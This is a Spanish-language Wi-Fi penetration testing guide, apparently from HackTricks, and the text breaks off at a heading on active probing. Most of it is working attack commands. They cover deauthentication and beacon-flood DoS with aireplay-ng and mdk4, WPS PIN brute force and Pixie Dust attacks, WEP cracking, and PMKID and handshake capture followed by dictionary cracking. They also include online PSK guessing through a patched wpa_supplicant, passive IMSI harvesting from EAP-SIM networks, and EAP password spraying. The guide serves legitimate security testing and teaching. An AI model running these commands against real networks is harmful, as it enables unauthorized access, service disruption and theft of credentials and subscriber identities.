# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Herramientas

### Hijacker & NexMon (Wi-Fi interno de Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Desde: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Puede realizar ataques Evil Twin, KARMA y Known Beacons y luego usar una plantilla de phishing para obtener la contraseña real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Hará automáticamente:

- Poner la interfaz en modo monitor
- Escanear redes posibles - Y permitirte seleccionar la(s) víctima(s)
- Si es WEP - Lanzar ataques WEP
- Si es WPA-PSK
- Si es WPS: Pixie dust attack and the bruteforce attack (ten cuidado: the brute-force attack podría tomar mucho tiempo). Observa que no intenta null PIN ni database/generated PINs.
- Intentar capturar el PMKID del AP para crack it
- Intentar deauthenticate clientes del AP para capturar un handshake
- Si PMKID o Handshake, intentar bruteforce usando top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Desconectar a todos (o un ESSID/Client específico)
- Random fake APs -- Ocultar redes, posible crash de scanners
- Overload AP -- Intentar kill the AP (usualmente no muy útil)
- WIDS -- Jugar con el IDS
- TKIP, EAPOL -- Algunos ataques específicos para DoS en algunos APs
- **Cracking**
- Crack **WEP** (varias herramientas y métodos)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (con o sin DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar captive portal creds y/o realizar ataques LAN
- **WPA-PSK** Evil Twin -- Útil para ataques de red si conoces la contraseña
- **WPA-MGT** -- Útil para capturar credenciales de la empresa
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar captive portal creds y/o realizar ataques LAN
- **+ WPA** -- Útil para capturar WPA handshakes

## Open / OWE networks quick notes

- **Passive capture** en SSIDs abiertos todavía funciona con modo monitor y tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) realiza un intercambio de claves por estación (no PSK), por lo que las tramas aéreas están cifradas incluso en SSIDs "open". Al estar basado en WPA3, también aplica **802.11w PMF**, que bloquea tramas de deauth/disassoc falsificadas.
- OWE **no autentica** a los que se unen: cualquiera puede asociarse, así que verifica el client isolation en lugar de confiar en afirmaciones de marketing. Sin isolation, ARP spoofing o envenenamiento estilo responder en el L2 local todavía funciona.
- **Evil Twin** sigue siendo factible en SSIDs open/OWE presentando una señal más fuerte; PMF solo elimina el atajo de deauth. Si las víctimas aceptan un certificado TLS forjado, se recupera un MitM HTTP(S) completo.
- El broadcast poisoning en Wi‑Fi guest abierto fácilmente produce creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Paquetes de Deauthentication

**Descripción tomada de** [**aquí**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **forcefully disconnect devices from a network**. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 es el número de deauths a enviar (puedes enviar múltiples si quieres); 0 significa enviarlos continuamente
- -a 00:14:6C:7E:40:80 es la dirección MAC del access point
- -c 00:0F:B5:34:30:30 es la dirección MAC del client a deauthenticate; si esto se omite entonces se envía broadcast deauthentication (no siempre funciona)
- ath0 es el nombre de la interfaz

### Disassociation Packets

**Disassociation packets**, similar to deauthentication packets, son un tipo de management frame usado en redes Wi‑Fi. Estos paquetes sirven para cortar la conexión entre un dispositivo (como un portátil o smartphone) y un access point (AP). La distinción principal entre disassociation y deauthentication radica en sus escenarios de uso. Mientras que un AP emite **deauthentication packets para eliminar explícitamente dispositivos rogue de la red, disassociation packets suelen enviarse cuando el AP está apagándose**, reiniciándose o reubicándose, por lo que es necesario desconectar todos los nodos conectados.

**Este ataque puede ser realizado por mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Más DOS attacks por mdk4**

**En** [**aquí**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envía beacon frames para mostrar APs falsos a los clientes. Esto a veces puede hacer que fallen los escáneres de red e incluso los controladores.
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar authentication frames a todos los Access Points (APs) accesibles dentro del alcance puede sobrecargar estos APs, especialmente cuando hay numerosos clientes involucrados. Este tráfico intenso puede provocar inestabilidad del sistema, haciendo que algunos APs se congelen o incluso se reinicien.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Explorar Puntos de Acceso (APs) verifica si un SSID se revela correctamente y confirma el alcance del AP. Esta técnica, junto con **bruteforcing hidden SSIDs** con o sin una wordlist, ayuda a identificar y acceder a redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar paquetes aleatorios o duplicados a diferentes colas QoS puede activar Michael Countermeasures en **TKIP APs**, provocando un apagado del AP durante un minuto. Este método es una táctica eficiente de ataque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar un AP con **EAPOL Start frames** crea **sesiones falsas**, saturando el AP y bloqueando a clientes legítimos. Alternativamente, inyectar **mensajes EAPOL Logoff falsos** desconecta forzosamente a los clientes; ambos métodos interrumpen eficazmente el servicio de red.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataques para redes en malla IEEE 802.11s**

Varios ataques contra la gestión de enlaces y el enrutamiento en redes en malla.

**ATTACK MODE w: WIDS Confusion**

Al interconectar clientes a múltiples nodos WDS o a rogue APs, se puede manipular los Sistemas de Detección y Prevención de Intrusiones, creando confusión y un posible abuso del sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un fuzzer de paquetes que ofrece diversas fuentes de paquetes y un conjunto completo de modificadores para la manipulación de paquetes.

### **Airggedon**

_**Airgeddon**_ ofrece la mayoría de los ataques propuestos en los comentarios anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) simplifica el proceso de conectar dispositivos a un router, aumentando la rapidez y facilidad de configuración para redes cifradas con **WPA** o **WPA2** Personal. Es ineficaz para la seguridad **WEP**, que se compromete con facilidad. WPS emplea un PIN de 8 dígitos, validado en dos mitades, lo que lo hace susceptible a ataques de fuerza bruta debido a su número limitado de combinaciones (11.000 posibilidades).

### WPS Bruteforce

Existen 2 herramientas principales para realizar esta acción: Reaver y Bully.

- **Reaver** ha sido diseñado para ser un ataque robusto y práctico contra WPS, y ha sido probado contra una amplia variedad de access points y implementaciones de WPS.
- **Bully** es una **nueva implementación** del WPS brute force attack, escrita en C. Tiene varias ventajas sobre el código original reaver: menos dependencias, mejor rendimiento de memoria y CPU, manejo correcto de endianness y un conjunto de opciones más robusto.

El ataque explota la **vulnerabilidad del PIN de WPS**, particularmente la exposición de los primeros cuatro dígitos y el papel del último dígito como checksum, lo que facilita el ataque de fuerza bruta. Sin embargo, las defensas contra ataques de fuerza bruta, como el **bloqueo de MAC addresses** de atacantes agresivos, exigen **MAC address rotation** para continuar el ataque.

Al obtener el PIN de WPS con herramientas como Bully o Reaver, el atacante puede deducir la **WPA/WPA2 PSK**, asegurando **acceso persistente a la red**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Este enfoque refinado apunta a los WPS PINs utilizando vulnerabilidades conocidas:

1. **Pre-discovered PINs**: Utiliza una base de datos de PINs conocidos vinculados a fabricantes específicos que suelen usar WPS PINs uniformes. Esta base de datos correlaciona los primeros tres octetos de las MAC-addresses con los PINs probables para estos fabricantes.
2. **PIN Generation Algorithms**: Aprovecha algoritmos como ComputePIN y EasyBox, que calculan los WPS PINs basándose en la MAC-address del AP. El algoritmo Arcadyan además requiere un device ID, añadiendo una capa al proceso de generación del PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descubrió un fallo en algunos Access Points (APs) relativo a la creación de códigos secretos, conocidos como **nonces** (**E-S1** y **E-S2**). Si estos nonces pueden deducirse, crackear el WPS PIN del AP se vuelve sencillo. El AP revela el PIN dentro de un código especial (hash) para demostrar que es legítimo y no un AP falso (rogue). Estos nonces son esencialmente las "claves" para abrir la "caja fuerte" que guarda el WPS PIN. Más sobre esto puede encontrarse [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En términos simples, el problema es que algunos APs no utilizaron claves lo suficientemente aleatorias para cifrar el PIN durante el proceso de conexión. Esto hace que el PIN sea vulnerable a ser adivinado desde fuera de la red (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si no quieres cambiar el dispositivo a monitor mode, o `reaver` y `bully` tienen algún problema, puedes probar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta herramienta puede realizar un Pixie Dust attack sin tener que cambiar al monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Algunos sistemas mal diseñados incluso permiten que un **Null PIN** (un PIN vacío o inexistente) conceda acceso, lo cual es bastante inusual. La herramienta **Reaver** es capaz de probar esta vulnerabilidad, a diferencia de **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques WPS propuestos se pueden realizar fácilmente usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 y 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
- 7 y 8 ejecutan el **Pixie Dust attack**
- 13 te permite probar el **NULL PIN**
- 11 y 12 **recopilarán los PINs relacionados con el AP seleccionado de bases de datos disponibles** y **generarán** posibles **PINs** usando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, ¿por qué no?)
- 9 y 10 probarán **todos los PINs posibles**

## **WEP**

**Por qué colapsa**

- RC4 seed is just **IV (24 bits) + shared key**. El IV está en cleartext, es pequeño (2^24) y se repite rápidamente, por lo que ciphertexts con el mismo IV reutilizan el keystream.
- XORing dos ciphertexts con el mismo keystream leaks `PlaintextA ⊕ PlaintextB`; encabezados predecibles + RC4 KSA biases (**FMS**) te permiten “votar” bytes de la key. **PTW** optimiza esto usando tráfico ARP para reducir los requisitos a decenas de miles de paquetes en lugar de millones.
- La integridad es solo **CRC32** (linear/unkeyed), por lo que un atacante puede voltear bits y recomputar CRC32 sin la key → packet forgery/replay/ARP injection mientras espera IVs.

La ruptura práctica es determinista:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon sigue incluyendo un flujo de trabajo WEP "All-in-One" si prefieres una interfaz guiada.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [reveló](https://hashcat.net/forum/thread-7717.html) un nuevo método de ataque, único porque solo necesita **un solo paquete** y no requiere que haya clientes conectados al AP objetivo; solo interacción entre el atacante y el AP.

Muchos routers modernos añaden un **campo opcional** a la **primera trama EAPOL** durante la asociación, conocido como `Robust Security Network`. Esto incluye el `PMKID`.

Como explica la publicación original, el **PMKID** se crea usando datos conocidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que "PMK Name" es constante, conocemos el BSSID del AP y la station, y el `PMK` es idéntico al de un 4-way handshake completo, **hashcat** can use this information to crack the PSK and recover the passphrase!

Para **gather** esta información y **bruteforce** la contraseña localmente puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Las **PMKIDs captured** se mostrarán en la **console** y también se **guardarán** dentro de \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato **hashcat/john** y crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tenga en cuenta que el formato de un hash correcto contiene **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si el suyo **solo** contiene **3 partes**, entonces, es **inválido** (la captura PMKID no fue válida).

Tenga en cuenta que `hcxdumptool` **también captura handshakes** (algo como esto aparecerá: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puede **transformar** los **handshakes** al formato de **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Captura de handshake

Un ataque a redes **WPA/WPA2** puede ejecutarse capturando un **handshake** e intentando **crack** el password **offline**. Este proceso implica monitorizar la comunicación de una red específica y su **BSSID** en un **channel** particular. Aquí tienes una guía simplificada:

1. Identifica el **BSSID**, el **channel**, y un **cliente conectado** de la red objetivo.
2. Usa `airodump-ng` para monitorizar el tráfico de la red en el **channel** y **BSSID** especificados, con la esperanza de capturar un handshake. El comando se verá así:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar la probabilidad de capturar un handshake, desconecta momentáneamente al cliente de la red para forzar una reautenticación. Esto se puede hacer usando el comando `aireplay-ng`, que envía paquetes de deauthentication al cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Cuando en `airodump-ng` aparezca información de handshake, eso significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../images/image (172) (1).png>)

Una vez que el handshake esté capturado, puedes realizar el **crack** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Comprobar si hay un handshake en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un handshake incompleto de una ESSID antes del handshake completo, no detectará el válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Adivinación de PSK en línea más rápida vía `wpa_supplicant` ctrl socket (sin clients/PMKID)

Cuando no hay clients alrededor y el AP rechaza PMKID, puedes iterar PSKs en línea sin volver a iniciar supplicants:

- Parchea `wpa_supplicant.c` para forzar `dur = 0;` en la lógica de backoff por fallos de autenticación (alrededor de `ssid->auth_failures`), deshabilitando efectivamente el temporizador de desactivación temporal.
- Ejecuta un único daemon con un control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Dirígelo a través de la interfaz de control, reutilizando el mismo scan y network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Un pequeño bucle en Python que lee eventos de socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) puede probar ~100 intentos en ~5 minutos sin la sobrecarga de escaneo. Sigue siendo ruidoso y detectable, pero evita reinicios de procesos por intento y retrasos de backoff.

## **WPA Enterprise (MGT)**

En **entornos WiFi empresariales, encontrarás varios métodos de autenticación**, cada uno ofreciendo distintos niveles de seguridad y funciones de gestión. Cuando usas herramientas como `airodump-ng` para inspeccionar el tráfico de red, podrías notar identificadores para estos tipos de autenticación. Algunos métodos comunes incluyen:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método soporta hardware tokens y one-time passwords dentro de EAP-PEAP. A diferencia de MSCHAPv2, no usa un peer challenge y envía passwords en plaintext al access point, lo que supone un riesgo para ataques de downgrade.
2. **EAP-MD5 (Message Digest 5)**:
- Implica enviar el hash MD5 del password desde el cliente. No es **recomendado** debido a su vulnerabilidad a ataques de diccionario, falta de server authentication y la incapacidad de generar WEP keys específicas por sesión.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados tanto en el cliente como en el servidor para la autenticación y puede generar dinámicamente WEP keys basadas en el usuario y la sesión para securizar las comunicaciones.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Proporciona autenticación mutua a través de un túnel encriptado, junto con un método para derivar WEP keys dinámicas por usuario y por sesión. Requiere solo certificados del lado del servidor, mientras que los clientes usan credenciales.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma similar a EAP creando un TLS tunnel para comunicación protegida. Permite el uso de protocolos de autenticación más débiles encima de EAP debido a la protección que ofrece el túnel.
- **PEAP-MSCHAPv2**: A menudo referido como PEAP, combina el mecanismo vulnerable de challenge/response de MSCHAPv2 con un TLS tunnel protector.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similar a EAP-TLS pero inicia un TLS tunnel antes de intercambiar certificados, ofreciendo una capa adicional de seguridad.

Puedes encontrar más información sobre estos métodos de autenticación [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) y [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de username

Leyendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que si estás usando **EAP** los **"Identity"** **messages** deben ser **soportados**, y el **username** se va a enviar en **claro** en los **"Response Identity"** messages.

Incluso usando uno de los métodos de autenticación más seguros: **PEAP-EAP-TLS**, es posible **capturar el username enviado en el protocolo EAP**. Para hacerlo, **captura una comunicación de autenticación** (arranca `airodump-ng` dentro de un canal y `wireshark` en la misma interfaz) y filtra los paquetes por `eapol`.\
Dentro del paquete "**Response, Identity**", aparecerá el **username** del cliente.

![](<../../images/image (850).png>)

### Identidades anónimas

El ocultamiento de la identidad es soportado tanto por EAP-PEAP como por EAP-TTLS. En el contexto de una red WiFi, una EAP-Identity request normalmente la inicia el access point (AP) durante el proceso de association. Para asegurar la protección del anonimato del usuario, la respuesta del EAP client en el dispositivo del usuario contiene solo la información esencial requerida para que el initial RADIUS server procese la petición. Este concepto se ilustra con los siguientes escenarios:

- EAP-Identity = anonymous
- En este escenario, todos los usuarios emplean el seudónimo "anonymous" como su identificador de usuario. El initial RADIUS server funciona como un servidor EAP-PEAP o EAP-TTLS, responsable de gestionar el lado servidor del protocolo PEAP o TTLS. El método de autenticación interno (protegido) se gestiona localmente o se delega a un RADIUS server remoto (home).
- EAP-Identity = anonymous@realm_x
- En esta situación, usuarios de diferentes realms ocultan sus identidades mientras indican sus respectivos realms. Esto permite que el initial RADIUS server haga proxy de las requests EAP-PEAP o EAP-TTLS hacia RADIUS servers en sus realms de origen, que actúan como el PEAP o TTLS server. El initial RADIUS server opera únicamente como un nodo relay de RADIUS.
- Alternativamente, el initial RADIUS server puede funcionar como el EAP-PEAP o EAP-TTLS server y manejar el método de autenticación protegido o reenviarlo a otro servidor. Esta opción facilita la configuración de políticas distintas para varios realms.

En EAP-PEAP, una vez que el TLS tunnel está establecido entre el PEAP server y el PEAP client, el PEAP server inicia una EAP-Identity request y la transmite a través del TLS tunnel. El cliente responde a esta segunda EAP-Identity request enviando una EAP-Identity response que contiene la identidad real del usuario a través del túnel encriptado. Este enfoque evita efectivamente la revelación de la identidad real del usuario a cualquiera que haga eavesdropping del tráfico 802.11.

EAP-TTLS sigue un procedimiento ligeramente diferente. Con EAP-TTLS, el cliente normalmente se autentica usando PAP o CHAP, asegurado por el TLS tunnel. En este caso, el cliente incluye un atributo User-Name y ya sea un atributo Password o CHAP-Password en el mensaje TLS inicial enviado tras el establecimiento del túnel.

Independientemente del protocolo elegido, el PEAP/TTLS server obtiene el conocimiento de la identidad real del usuario después de que el TLS tunnel ha sido establecido. La identidad real puede representarse como user@realm o simplemente user. Si el PEAP/TTLS server también es responsable de autenticar al usuario, ahora posee la identidad del usuario y procede con el método de autenticación protegido por el TLS tunnel. Alternativamente, el PEAP/TTLS server puede reenviar una nueva RADIUS request al home RADIUS server del usuario. Esta nueva RADIUS request omite la capa de protocolo PEAP o TTLS. En casos donde el método de autenticación protegido es EAP, los mensajes EAP internos son transmitidos al home RADIUS server sin el wrapper EAP-PEAP o EAP-TTLS. El User-Name attribute del mensaje RADIUS saliente contiene la identidad real del usuario, reemplazando el User-Name anonymous de la RADIUS request entrante. Cuando el método de autenticación protegido es PAP o CHAP (soportado solo por TTLS), el User-Name y otros atributos de autenticación extraídos del payload TLS son sustituidos en la RADIUS request saliente, desplazando el User-Name anonymous y los atributos TTLS EAP-Message presentes en la RADIUS request entrante.

Para más info consulta [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

La autenticación Wi‑Fi basada en SIM usando EAP‑SIM/EAP‑AKA sobre 802.1X puede leak el identificador permanente del suscriptor (IMSI) en texto claro durante la fase de identidad no autenticada si la implementación no incorpora pseudónimos/protected identities o un TLS tunnel alrededor del EAP interno.

Dónde ocurre el leak (nivel alto):
- La asociación 802.11 completa con el SSID (a menudo SSIDs de offload de operadores como FreeWifi_secure, realms tipo eduroam, etc.).
- El Authenticator envía EAP-Request/Identity.
- Clientes vulnerables responden EAP-Response/Identity con su identidad permanente = IMSI codificada como un 3GPP NAI, antes de cualquier protección.
- Ejemplo de NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Cualquiera que esté escuchando pasivamente la RF puede leer ese frame. No se necesita 4-way handshake ni keying TLS.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Haz clic para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de cualquier túnel TLS si la implementación usa EAP‑SIM/AKA sin identidad protegida/pseudónimos.
- El valor expuesto es un identificador permanente vinculado a la SIM del suscriptor; su recolección permite rastreo a largo plazo y abusos posteriores en telecomunicaciones.

Impacto
- Privacidad: seguimiento persistente de usuarios/dispositivos a partir de capturas pasivas de Wi‑Fi en lugares públicos.
- Abusos en telecomunicaciones: con el IMSI, un atacante con acceso a SS7/Diameter puede consultar la ubicación o intentar interceptar llamadas/SMS y robar MFA.

Mitigaciones / qué buscar
- Verificar que los clientes usen identidades externas anónimas (pseudonyms) para EAP‑SIM/AKA según la guía 3GPP (p. ej., 3GPP TS 33.402).
- Preferir tunelizar la fase de identidad (p. ej., EAP‑TTLS/PEAP que transporte EAP‑SIM/AKA interno) para que el IMSI nunca se envíe en claro.
- Las capturas de paquetes de association/auth nunca deberían revelar un IMSI en bruto en EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
También puedes realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoría de ataques a clientes

### Selección de red y roaming

- El protocolo 802.11 define cómo una estación se une a un Extended Service Set (ESS) pero no especifica los criterios para seleccionar un ESS o un punto de acceso (AP) dentro de él.
- Las estaciones pueden hacer roaming entre APs que comparten el mismo ESSID, manteniendo la conectividad a través de un edificio o área.
- El protocolo exige la autenticación de la estación al ESS pero no obliga a la autenticación del AP hacia la estación.

### Listas de redes preferidas (PNLs)

- Las estaciones almacenan el ESSID de cada red inalámbrica a la que se conectan en su lista de redes preferidas (PNL), junto con detalles de configuración específicos de la red.
- La PNL se usa para conectarse automáticamente a redes conocidas, mejorando la experiencia del usuario al simplificar el proceso de conexión.

### Escaneo pasivo

- Los APs transmiten periódicamente beacon frames, anunciando su presencia y características, incluyendo el ESSID del AP a menos que la difusión esté deshabilitada.
- Durante el escaneo pasivo, las estaciones escuchan beacon frames. Si el ESSID de un beacon coincide con una entrada en la PNL de la estación, la estación puede conectarse automáticamente a ese AP.
- Conocer la PNL de un dispositivo permite una posible explotación al imitar el ESSID de una red conocida, engañando al dispositivo para que se conecte a un AP malicioso.

### Sondeo activo

